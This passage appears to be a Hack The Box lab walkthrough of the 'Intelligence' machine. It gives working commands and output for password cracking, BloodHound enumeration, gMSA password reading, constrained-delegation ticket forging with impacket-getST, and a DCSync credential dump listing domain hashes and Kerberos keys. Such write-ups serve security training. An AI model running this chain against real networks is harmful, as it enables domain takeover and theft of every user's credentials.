<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TED.GRAVES::intelligence:a4da3d4736a14f9f:4b00b35c5d384a9309f168953f5ac077:0101000000000000ce7ecfb79742dc018548ff43a79edd370000000002000800590055004b00470001001e00570049004e002d00580037003000580032004a005800360036005600510004001400590055004b0047002e004c004f00430041004c0003003400570049004e002d00580037003000580032004a00580036003600560051002e00590055004b0047002e004c004f00430041004c0005001400590055004b0047002e004c004f00430041004c000800300030000000000000000000000000200000fb96b576818f6e10c4053a5ab87d226bc19bce5277823fd2cf6ecb09d732b8690a0010000000000000000000000000000000000009003c0048005400540050002f00770065006200700077006e00650064002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

<SNIP>
```

We can see that we have successfully cracked the NTLMv2 hash to reveal the plaintext password `Mr.Teddy` for the user `Ted.Graves`

With the new credentials (`Ted.Graves`:`Mr.Teddy`), we can go ahead and validate if these are valid authentication credentials using `crackmapexec`.

```bash
0x3ds@kali $ crackmapexec smb 10.129.235.228 -u 'Ted.Graves' -p 'Mr.Teddy'       

SMB   10.129.235.228   445   DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

SMB   10.129.235.228   445   DC   [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```

We can see that we have been able to successfully authenticate to the SMB service using the credentials for `Ted.Graves`, confirming the password is valid.


---
### Lateral Movement (Part 2)

We can now perform further enumeration using `Ted.Graves` credentials. Upon looking through the SMB Shares that Ted has access to, there is nothing further for us to leverage to move laterally or escalate our privileges. We could run a few enumeration commands utilising LDAP calls, however it would be quicker for us to utilise a tool such as `bloodhound` to enumerate the active directory environment and visually see it all. 

We can use the `bloodhound-ce-python` tool to achieve this or `bloodhound-python` if using `bloodhound legacy`.

```bash
0x3ds@kali $ sudo bloodhound-ce-python -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.129.235.228 -d intelligence.htb -c all --zip

NFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20251022005557_bloodhound.zip
```

We can now open bloodhound which will automatically start up our neo4j server.

```bash
0x3ds@kali $ sudo bloodhound

 Starting neo4j
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:251256). It is available at http://localhost:7474
There may be a short delay until the server is ready.
............
 Bloodhound will start

 IMPORTANT: It will take time, please wait...


 opening http://127.0.0.1:8080
```


Once `bloodhound` opens up in our browser, we can go ahead and select `Quick Upload` from the left hand side and select the .zip output file from `bloodhound-ce-python` (in our case it is `20251022005557_bloodhound.zip`).

Once the data is uploaded, we can select the Search box and type in the user `Ted.Graves` and select it from the drop down.

We can then select the `TED.GRAVES@INTELLIGENCE.HTB` item which will open up a panel on the right-hand side showing various pieces of information about this user/active directory object. 

Next, scrolling down the right hand side and expanding the heading `Outbound Object Control` will display additional objects and their relationships.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_20.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_20.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can see the following:
- The user `Ted.Graves` is a member of the `ITSUPPORT` group.
- Members of the `ITSUPPORT` group have the ability (via `ReadGMSAPassword`) to retrieve the password for the Group Managed Service Account ("GMSA") `svc_int$@intelligence.htb`.

As per `Bloodhound`, Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute). The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

This means that since `Ted.Graves` is a member of the `ITSUPPORT` group, we can utilise this user to retrieve the password for the GMSA account `svc_int$@intelligence.htb`. 

We can click on the `ReadGMSAPassword` chain and expand the `Linux Abuse` heading to view further details on how we can leverage this.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_21.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_21.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We can utilise the [**tool**](https://github.com/micahvandeusen/gMSADumper) `gMSADumper` to reads any gMSA password blobs the user can access and parses the values.

First, we need to add the following entry into our `/etc/hosts` file since we are unable to specify the Domain Controller IP Address using this tool.

```bash
0x3ds@kali $ echo "10.129.235.228 intelligence.htb dc.intelligence.htb" | sudo tee -a /etc/hosts

10.129.235.228 intelligence.htb dc.intelligence.htb
```

Now we can use the `gMSADumper.py` tool.

```bash
0x3ds@kali $ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb

Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c5f5537e080917d785293aeb90120854
svc_int$:aes256-cts-hmac-sha1-96:a90da9b1d3dff35359ccd55cad2d218057cb8d13cd4feca8a34df44cbfb9e61b
svc_int$:aes128-cts-hmac-sha1-96:e17e370a4030f67428f7046f065e60eb
```

We have successfully obtained the password hash for the `svc_int$` account.


---
### Privilege Escalation

We can return to `bloodhound` and now search for the user `svc_int$` and select the drop down option `SVC_INT$@INTELLIGENCE.HTB`. Next, we can select the object from our bloodhound interface which will open up the right hand side properties panel. We can then scroll down and expand the heading `Execution Privileges` -> `Constrained Delegation Privileges`. 

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_22.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_22.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can see that the user `svc_int$` has constrained delegation permission to the domain controller `DC.INTELLIGENCE.HTB`.

Further, if we scroll back up and expand the `Object Information` for the `svc_int$` user, we can see that it states it can delegate `WWw/dc.intelligence.htb`.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_23.png){: .light .w-50 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_23.png){: .dark .w-50 .shadow .rounded-10 w='1212' h='668' }


As per `Bloodhound`, the constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this permission can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is "HTTP/host.domain.com", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.

We can click on the `AllowedToDelegate` chain and expand the `Linux Abuse` heading to view further details on how we can leverage this.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_24.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_24.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We can utilise the tool `impacket-getST` from the [**impacket toolkit**](https://github.com/SecureAuthCorp/impacket) to request a forged ticket from the delegated service.

```bash
0x3ds@kali $ impacket-getST -spn 'www/dc.intelligence.htb' -impersonate administrator intelligence.htb/svc_int -hashes :c5f5537e080917d785293aeb90120854 -dc-ip 10.129.235.228

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Now that we have the ticket saved in the file `administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache` we can go ahead and export this to the `KRB5CCNAME` environment variable. This is required as we will be trying to use this ticket to authenticate via kerberos.

```bash
0x3ds@kali $ export KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

```

Now we could utilise the tool `impacket-wmiexec` to try and use our ticket to authenticate to the domain controller as the impersonated `administrator` user.

However, we are going for the crown jewels and instead we can utilise the tool `impacket-secretsdump` to perform a DCSync attack against the Domain Controller to dump all the credentials by using our ticket to authenticate to the domain controller as the impersonated `administrator` user.

```bash
0x3ds@kali $ impacket-secretsdump -k -no-pass intelligence.htb/administrator@dc.intelligence.htb

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xcae14f646af6326ace0e1f5b8b4146df
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0054cc2f7ff3b56d9e47eb39c89b521f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
intelligence\DC$:plain_password_hex:b3889dab8e5e81655064ed07feeec18cad94bc712df535037bdda6f3dd5de0f319e6f93f168a22260cc0e538a2143ceaa2673d5b482b222ecbecc194739ef815e546a9069845bd55add5495219b9035628d1fbac5398c4358dfa20555e646fa22dc38e96baa50db9692fffd89180bfc87a224951f763032dd73e777bb2481641279e3ffb921f4a5af03dad99d86e2567d2314c81409cbf2ef8870f796435547f0fda0f28e723db36de71568e7aaa7b2af223b2e6c49b939d720db11d6e932f7800c9753fc0e3990918a99365e6212c9fc3f3053882505e55cddbb1c7c2161a751d7b9ab85a2a2c78e9659ddf1d100f61
intelligence\DC$:aad3b435b51404eeaad3b435b51404ee:cf7b04053c018c1fbe29ed1c178152b1:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc3430503ab11d38db01911c159fe940bd8ec7cdb                                                                                                          
dpapi_userkey:0x43fdd77605cdb58e14fb6a5c90c976fde8f4f2ea                                                                                                             
[*] NL$KM                                                                                                                                                            
 0000   16 C9 75 0F 89 FB F6 CD  00 43 BC 42 C3 58 4B 39   ..u......C.B.XK9                                                                                          
 0010   0F 08 5E E8 24 55 D1 75  52 8E C7 D6 0F 59 63 9A   ..^.$U.uR....Yc.                                                                                          
 0020   21 16 71 3E 7A 43 AE 23  46 96 4E 14 44 6B C7 F3   !.q>zC.#F.N.Dk..                                                                                          
 0030   A8 B7 ED 3A AA D3 72 94  96 64 01 9D 04 05 91 3E   ...:..r..d.....>                                                                                          
NL$KM:16c9750f89fbf6cd0043bc42c3584b390f085ee82455d175528ec7d60f59639a2116713e7a43ae2346964e14446bc7f3a8b7ed3aaad372949664019d0405913e                               
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_4d83561cd4f50d4b311d35d8c070ea7b5a572ebd704982784225bd68febae815                                           
 0000   20 76 93 E8 53 4D 21 34  C9 D3 32 29 6E B3 AA AF    v..SM!4..2)n...                                                                                          
 0010   99 70 41 2A 77 5A 66 CC  99 23 26 1D DE 22 1B FD   .pA*wZf..#&.."..                                                                                          
 0020   DD 9D 5C 6D CC 74 38 49  CD BD 37 70 23 9A 33 24   ..\m.t8I..7p#.3$                                                                                          
 0030   14 6E B8 35 B5 24 2A 0D  50 2B D7 04 3A 44 32 C0   .n.5.$*.P+..:D2.                                                                                          
 0040   B4 97 95 16 29 0C 51 BA  8A 4C D0 68 4D 85 2D 92   ....).Q..L.hM.-.                                                                                          
 0050   1F BD 78 9C 03 69 FC 97  68 2C CE 95 50 16 A7 55   ..x..i..h,..P..U                                                                                          
 0060   EB 37 C7 AB BE 86 71 5A  3C 24 86 AE 1B 91 9A AD   .7....qZ<$......                                                                                          
 0070   17 9A D4 D5 4F DD 1B 0C  BD D5 64 5E 7D FD 79 23   ....O.....d^}.y#                                                                                          
 0080   A8 4E DF 6B FA EB DF E5  B7 80 90 55 A2 9B 4F 7C   .N.k.......U..O|                                                                                          
 0090   BC 69 04 8F 66 5C 1A 45  BC 87 9C C2 17 E0 62 F5   .i..f\.E......b.
 00a0   93 5B 25 E1 7C 16 35 E6  BB D3 1A 2C D6 2E 8D 5C   .[%.|.5....,...\
 00b0   78 51 B5 7A 2E 27 70 52  D8 A3 71 8C E8 9B A2 2C   xQ.z.'pR..q....,
 00c0   71 58 47 FB 0F DB 8E A9  D9 59 ED EB 27 AC 8B 15   qXG......Y..'...
 00d0   EF 49 6C 20 42 64 26 BB  42 23 0F 2C 4A E1 D4 43   .Il Bd&.B#.,J..C
 00e0   0E 04 A1 11 E1 F9 DB 3C  B6 8F 91 D7 62 E9 EE 6E   .......<....b..n
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_4d83561cd4f50d4b311d35d8c070ea7b5a572ebd704982784225bd68febae815:207693e8534d2134c9d332296eb3aaaf9970412a775a66cc9923261dde221bfddd9d5c6dcc743849cdbd3770239a3324146eb835b5242a0d502bd7043a4432c0b4979516290c51ba8a4cd0684d852d921fbd789c0369fc97682cce955016a755eb37c7abbe86715a3c2486ae1b919aad179ad4d54fdd1b0cbdd5645e7dfd7923a84edf6bfaebdfe5b7809055a29b4f7cbc69048f665c1a45bc879cc217e062f5935b25e17c1635e6bbd31a2cd62e8d5c7851b57a2e277052d8a3718ce89ba22c715847fb0fdb8ea9d959edeb27ac8b15ef496c20426426bb42230f2c4ae1d4430e04a111e1f9db3cb68f91d762e9ee6e
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_4d83561cd4f50d4b311d35d8c070ea7b5a572ebd704982784225bd68febae815 
 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........
 0010   12 56 0B F9 6B E3 54 1B  D2 54 A9 63 78 84 2B ED   .V..k.T..T.cx.+.
 0020   9B 42 09 51 D3 00 5B 2B  29 F4 B1 4B 95 FD FA 84   .B.Q..[+)..K....
 0030   69 0C CB DC 5C 2E 9D A7  66 A3 AF 71 17 95 76 D7   i...\...f..q..v.
 0040   32 9E 41 52 30 80 15 14  73 AE BB 80 8E 07 9B 81   2.AR0...s.......
 0050   C6 24 A9 51 B2 FD FA CF  FC C3 8F D2 AB 0E 86 27   .$.Q...........'
 0060   22 D9 A0 A0 93 FD 39 59  93 29 34 77 90 BB A1 FA   ".....9Y.)4w....
 0070   42 E7 FE 81 47 9B 0F D3  20 78 FD 2F AC 0F AD 08   B...G... x./....
 0080   A8 9B 5D 98 6F F4 AC A2  B9 36 73 F4 11 9F 45 01   ..].o....6s...E.
 0090   30 BC 74 8A 08 84 C6 65  11 4E 90 7D A1 E9 49 F3   0.t....e.N.}..I.
 00a0   4B 92 A9 9E 2D 38 0A 73  B4 20 3D 25 CF A2 41 AE   K...-8.s. =%..A.
 00b0   AD 3E 76 A2 17 CF 4A 44  98 AF 88 5E D8 77 80 E9   .>v...JD...^.w..
 00c0   75 AA BC 5D 6E 8A 75 BA  D5 89 D2 AD 70 5F E9 E1   u..]n.u.....p_..
 00d0   6B 41 20 1D 92 A2 1B 73  2C 20 30 03 3B 99 0F 0C   kA ....s, 0.;...
 00e0   FF 2A F8 D8 EE CE 04 F1  7D 32 13 1C C2 78 06 87   .*......}2...x..
 00f0   8D C8 8C B2 CC 60 87 FF  E7 B4 0F 60 E8 79 41 06   .....`.....`.yA.
 0100   3E B9 23 B4 F0 7F 76 A9  C2 57 BF D2 41 3C 55 79   >.#...v..W..A<Uy
 0110   00 00 1E E1 AC FB 8B 17  00 00 1E 83 DC 48 8B 17   .............H..
 0120   00 00                                              ..
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_4d83561cd4f50d4b311d35d8c070ea7b5a572ebd704982784225bd68febae815:01000000220100001000000012011a0112560bf96be3541bd254a96378842bed9b420951d3005b2b29f4b14b95fdfa84690ccbdc5c2e9da766a3af71179576d7329e41523080151473aebb808e079b81c624a951b2fdfacffcc38fd2ab0e862722d9a0a093fd39599329347790bba1fa42e7fe81479b0fd32078fd2fac0fad08a89b5d986ff4aca2b93673f4119f450130bc748a0884c665114e907da1e949f34b92a99e2d380a73b4203d25cfa241aead3e76a217cf4a4498af885ed87780e975aabc5d6e8a75bad589d2ad705fe9e16b41201d92a21b732c2030033b990f0cff2af8d8eece04f17d32131cc27806878dc88cb2cc6087ffe7b40f60e87941063eb923b4f07f76a9c257bfd2413c557900001ee1acfb8b1700001e83dc488b170000
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9ce5f83a494226352bca637e8c1d6cb6:::
intelligence.htb\Danny.Matthews:1103:aad3b435b51404eeaad3b435b51404ee:9112464222be8b09d663916274dd6b61:::
intelligence.htb\Jose.Williams:1104:aad3b435b51404eeaad3b435b51404ee:9e3dbd7d331c158da69905a1d0c15244:::
intelligence.htb\Jason.Wright:1105:aad3b435b51404eeaad3b435b51404ee:01295a54d60d3d2498aa12d5bbdea996:::
intelligence.htb\Samuel.Richardson:1106:aad3b435b51404eeaad3b435b51404ee:fa7c1a2537f2094bd10e3eddc8e04612:::
intelligence.htb\David.Mcbride:1107:aad3b435b51404eeaad3b435b51404ee:f7aacab8c61105a5d5f99382ace61ddf:::
intelligence.htb\Scott.Scott:1108:aad3b435b51404eeaad3b435b51404ee:b1279fc1d13e461ad3d81cbe5d79c7b5:::
intelligence.htb\David.Reed:1109:aad3b435b51404eeaad3b435b51404ee:5093f8ee65ea9e45aa0c00294d2d2834:::
intelligence.htb\Ian.Duncan:1110:aad3b435b51404eeaad3b435b51404ee:54eecca1b18b2741d81c872e69d7683d:::
intelligence.htb\Michelle.Kent:1111:aad3b435b51404eeaad3b435b51404ee:8bcc0a6ef0f6af2d22c7cdb23916059b:::
intelligence.htb\Jennifer.Thomas:1112:aad3b435b51404eeaad3b435b51404ee:981ae8ccea28b73908b6fa84384f4b22:::
intelligence.htb\Kaitlyn.Zimmerman:1113:aad3b435b51404eeaad3b435b51404ee:b07a75753c543a62b723534a667c39f3:::
intelligence.htb\Travis.Evans:1114:aad3b435b51404eeaad3b435b51404ee:30dd4d476e41b06265b65733136fb36a:::
intelligence.htb\Kelly.Long:1115:aad3b435b51404eeaad3b435b51404ee:a7c756e91ca82214506b523d920e6832:::
intelligence.htb\Nicole.Brock:1116:aad3b435b51404eeaad3b435b51404ee:98613c903c14423b592661c4674044ae:::
intelligence.htb\Stephanie.Young:1117:aad3b435b51404eeaad3b435b51404ee:0ba0e6dbe23c31cea88cd59021ab2f86:::
intelligence.htb\John.Coleman:1118:aad3b435b51404eeaad3b435b51404ee:a8d4315cab221a40f074ba324d81c030:::
intelligence.htb\Thomas.Valenzuela:1119:aad3b435b51404eeaad3b435b51404ee:9d154569044998e5288dbc8db23032b1:::
intelligence.htb\Thomas.Hall:1120:aad3b435b51404eeaad3b435b51404ee:2c605feb1ddfcc1428ac01604369f3eb:::
intelligence.htb\Brian.Baker:1121:aad3b435b51404eeaad3b435b51404ee:138417b615241fea307b3956882d7e32:::
intelligence.htb\Richard.Williams:1122:aad3b435b51404eeaad3b435b51404ee:a921c66a125732a106dceb8ced647961:::
intelligence.htb\Teresa.Williamson:1123:aad3b435b51404eeaad3b435b51404ee:2ae920ebb038642277ca04f8f86ddb9e:::
intelligence.htb\David.Wilson:1124:aad3b435b51404eeaad3b435b51404ee:31549b056a43fcbdf65c70405e751de4:::
intelligence.htb\Darryl.Harris:1125:aad3b435b51404eeaad3b435b51404ee:730ad44839da160afa8bfd3f04a47a50:::
intelligence.htb\William.Lee:1126:aad3b435b51404eeaad3b435b51404ee:64a67569a7f005abf8c7b24654f1f078:::
intelligence.htb\Thomas.Wise:1127:aad3b435b51404eeaad3b435b51404ee:ba93357ccfc73c0dbda18b9d9a97ca6a:::
intelligence.htb\Veronica.Patel:1128:aad3b435b51404eeaad3b435b51404ee:8d8cf98e6d4aae40aaa1c9ef4444368a:::
intelligence.htb\Joel.Crawford:1129:aad3b435b51404eeaad3b435b51404ee:f8b14fe0d95e5edb105115482c7bdb56:::
intelligence.htb\Jean.Walter:1130:aad3b435b51404eeaad3b435b51404ee:ea49f2855d90384ee026a9d09780a0de:::
intelligence.htb\Anita.Roberts:1131:aad3b435b51404eeaad3b435b51404ee:4e2f58237af2453a0ca050cd968fc0a3:::
intelligence.htb\Brian.Morris:1132:aad3b435b51404eeaad3b435b51404ee:ac7b0ea3c16cd6ff264aa85f329e7fd4:::
intelligence.htb\Daniel.Shelton:1133:aad3b435b51404eeaad3b435b51404ee:627d3ac82ca3ecfed61f34db98aa365f:::
intelligence.htb\Jessica.Moody:1134:aad3b435b51404eeaad3b435b51404ee:f6a67905a68c16059ac0aa7e99fbfd05:::
intelligence.htb\Tiffany.Molina:1135:aad3b435b51404eeaad3b435b51404ee:7749fa32e4679d5d071a8d2922675d68:::
intelligence.htb\James.Curbow:1136:aad3b435b51404eeaad3b435b51404ee:cd24b204f3965c7b886b7c7d305d8ed8:::
intelligence.htb\Jeremy.Mora:1137:aad3b435b51404eeaad3b435b51404ee:ab2e8e327fb6353e732f17fb8156038c:::
intelligence.htb\Jason.Patterson:1138:aad3b435b51404eeaad3b435b51404ee:564c8835ccaa0b8f2c0523b7ea4b341d:::
intelligence.htb\Laura.Lee:1139:aad3b435b51404eeaad3b435b51404ee:d7130cfb6752d373280274d07a78cbaf:::
intelligence.htb\Ted.Graves:1140:aad3b435b51404eeaad3b435b51404ee:421001de12db5325304b41275a0407b9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf7b04053c018c1fbe29ed1c178152b1:::
svc_int$:1144:aad3b435b51404eeaad3b435b51404ee:c5f5537e080917d785293aeb90120854:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
Administrator:des-cbc-md5:2362bc3191f23732
krbtgt:aes256-cts-hmac-sha1-96:99d40a110afcd64282082cf9d523f11f65b3d142078c1f3121d7fbae9a8c3a26
krbtgt:aes128-cts-hmac-sha1-96:49b9d45a7dd5422ad186041ba9d86a7e
krbtgt:des-cbc-md5:a237bfc8f7b58579
intelligence.htb\Danny.Matthews:aes256-cts-hmac-sha1-96:3470fddc02448815f231bf585fc00165304951d3b04414222be904af7c925473
intelligence.htb\Danny.Matthews:aes128-cts-hmac-sha1-96:72961eb071e69b594f649b2f0cfb38cf
intelligence.htb\Danny.Matthews:des-cbc-md5:98f7736bcb9dc81f
intelligence.htb\Jose.Williams:aes256-cts-hmac-sha1-96:e733cfef56e3fd37eadb3a8b2f0845c2d014ee26892680ed8878632e5019c4ab
intelligence.htb\Jose.Williams:aes128-cts-hmac-sha1-96:94cd916dee769a98ed763a5d864a4486
intelligence.htb\Jose.Williams:des-cbc-md5:d07f38548013d37f
intelligence.htb\Jason.Wright:aes256-cts-hmac-sha1-96:0facd3ad464e633b16454e5e3a2d14bf8460ecc1e39ce2c92788a444b3716f1c
intelligence.htb\Jason.Wright:aes128-cts-hmac-sha1-96:0e85a159ad7605f55817393006e9bd51
intelligence.htb\Jason.Wright:des-cbc-md5:9194da836e8c9238
intelligence.htb\Samuel.Richardson:aes256-cts-hmac-sha1-96:112469103d5114a5355c9db2d4d6d69a1d685390e5c1ec0f1c4c31ab89013b8d
intelligence.htb\Samuel.Richardson:aes128-cts-hmac-sha1-96:16658c2b56df4ed113950bca88fbddaf
intelligence.htb\Samuel.Richardson:des-cbc-md5:d63145758054980e
intelligence.htb\David.Mcbride:aes256-cts-hmac-sha1-96:e820c31eda49f5f5044c0ab8cab56bc7b0ce67369ac5565564a80d9459aa2688
intelligence.htb\David.Mcbride:aes128-cts-hmac-sha1-96:70f82063e0d751c578d3720b0c91c9d1
intelligence.htb\David.Mcbride:des-cbc-md5:0ef11f6bce10f226
intelligence.htb\Scott.Scott:aes256-cts-hmac-sha1-96:965e3bdb31fddef7d225ee0f3bc29da8374b3fbc78db354172599c2d0bbc5a2d
intelligence.htb\Scott.Scott:aes128-cts-hmac-sha1-96:679d6a497c460af78feb18be86c906f0
intelligence.htb\Scott.Scott:des-cbc-md5:40ad61da9e13ec2a
intelligence.htb\David.Reed:aes256-cts-hmac-sha1-96:c4deea07df497a77f6f84582704d304d0ee6a4d49ebd782c39a9a552fef1b2b5
intelligence.htb\David.Reed:aes128-cts-hmac-sha1-96:138480edac273065ee620dcd03710dd3
intelligence.htb\David.Reed:des-cbc-md5:e368e9f1e6d5dfa8
intelligence.htb\Ian.Duncan:aes256-cts-hmac-sha1-96:d58821922aab776c8f15c3213a84da5d070c9ad8134e69f8f1546558e18061d8
intelligence.htb\Ian.Duncan:aes128-cts-hmac-sha1-96:29fc796179d2a6626e96c1178ba414c3
intelligence.htb\Ian.Duncan:des-cbc-md5:3d49cdfb8ca24357
intelligence.htb\Michelle.Kent:aes256-cts-hmac-sha1-96:aaf5ba002819705fb89e5dcbaffedb2c4c0909dbf6dc2274eade8ba4c4c03c6f
intelligence.htb\Michelle.Kent:aes128-cts-hmac-sha1-96:c7b85b205732e43876e1b139559d088e
intelligence.htb\Michelle.Kent:des-cbc-md5:5279cbe91a37855b
intelligence.htb\Jennifer.Thomas:aes256-cts-hmac-sha1-96:3bf38c83a092897d6da8308fdf759125d0b04ef670419f9c1079687e05105013
intelligence.htb\Jennifer.Thomas:aes128-cts-hmac-sha1-96:c9b5fda759614149e75a7a694773c628
intelligence.htb\Jennifer.Thomas:des-cbc-md5:ecbc4aaecd64d6d9
intelligence.htb\Kaitlyn.Zimmerman:aes256-cts-hmac-sha1-96:4c96bddc73accb5b94105ddff69cca796a4b394836f6c5621ef9b063eeb0613a
intelligence.htb\Kaitlyn.Zimmerman:aes128-cts-hmac-sha1-96:b272f50bd0c5fc39eb4a16d8baa52ac3
intelligence.htb\Kaitlyn.Zimmerman:des-cbc-md5:f84f2af20454c704
intelligence.htb\Travis.Evans:aes256-cts-hmac-sha1-96:971c2ec7ea7608a702b256888d9f1c934edaae423c1dd903ce78a3665fb420e0
intelligence.htb\Travis.Evans:aes128-cts-hmac-sha1-96:f32b62ee858b6f2418f83ce0e0ef7724
intelligence.htb\Travis.Evans:des-cbc-md5:c8f46dd313c40df2
intelligence.htb\Kelly.Long:aes256-cts-hmac-sha1-96:b9f50686f16c21ed608acc6e8dabd9087b0a2ca2b5ed48ffab4e97f0ddcca58d
intelligence.htb\Kelly.Long:aes128-cts-hmac-sha1-96:780bc7c8cb901a9edcc946b37cfb4b3b
intelligence.htb\Kelly.Long:des-cbc-md5:25381cef0229914a
intelligence.htb\Nicole.Brock:aes256-cts-hmac-sha1-96:c0c526274cee689a0a4c824b6b37a9c75d2f67b0ebfa4b442730e9ebbbca2eec
intelligence.htb\Nicole.Brock:aes128-cts-hmac-sha1-96:a61d2b568b9b3535fc21d24975127db3
intelligence.htb\Nicole.Brock:des-cbc-md5:1554e3702a1954bc
intelligence.htb\Stephanie.Young:aes256-cts-hmac-sha1-96:ea36d54289dd438b308da64ab3b69a23a644e8f6808530bcda8882881905a8fd
intelligence.htb\Stephanie.Young:aes128-cts-hmac-sha1-96:018222835d22f07d1c252cd6fa0710eb
intelligence.htb\Stephanie.Young:des-cbc-md5:461ffd7cfbc8f719
intelligence.htb\John.Coleman:aes256-cts-hmac-sha1-96:8067bb73df474595a8bc723f4de2ab0a86fb910d93f0ab6102e3fb63768c8403
intelligence.htb\John.Coleman:aes128-cts-hmac-sha1-96:c79cab0353ad47f96ad2535c1532e3b4
intelligence.htb\John.Coleman:des-cbc-md5:1a8f61daf88cada4
intelligence.htb\Thomas.Valenzuela:aes256-cts-hmac-sha1-96:6ece4d420a8b29d9ecbe3cfe8fdd3acb2d5f1ae08df82e793ad381ce9c438519
intelligence.htb\Thomas.Valenzuela:aes128-cts-hmac-sha1-96:1adc220bb780a27c2e132e6f56b300e1
intelligence.htb\Thomas.Valenzuela:des-cbc-md5:4a20f2cbc48f4a25
intelligence.htb\Thomas.Hall:aes256-cts-hmac-sha1-96:42c2083058468fdd87d99f499f1bf28d2e1fe52ca9905749449870350e122538
